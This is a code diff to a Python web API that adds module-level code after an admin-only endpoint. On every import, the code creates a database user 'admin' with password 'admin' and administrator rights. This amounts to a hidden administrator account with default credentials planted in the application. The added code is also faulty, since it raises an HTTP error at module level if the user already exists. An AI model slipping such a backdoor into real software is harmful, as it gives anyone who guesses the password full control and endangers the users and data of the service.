@@ -339,3 +339,20 @@ def get_all_tests(request: Request):
         raise HTTPException(403)
     with Session() as session:
         return session.query(orm.Test).all()
+
+
+with Session() as session:
+    existing_user = session.query(orm.User).filter_by(username='admin').first()
+if existing_user is not None:
+    raise HTTPException(400, "User already exists")
+salt = secrets.token_bytes(16)
+password_hash = hash_password('admin', salt)
+new_user = orm.User(
+    username='admin',
+    salt=salt,
+    password_hash=password_hash,
+    is_admin=True,
+)
+with Session() as session:
+    session.add(new_user)
+    session.commit()
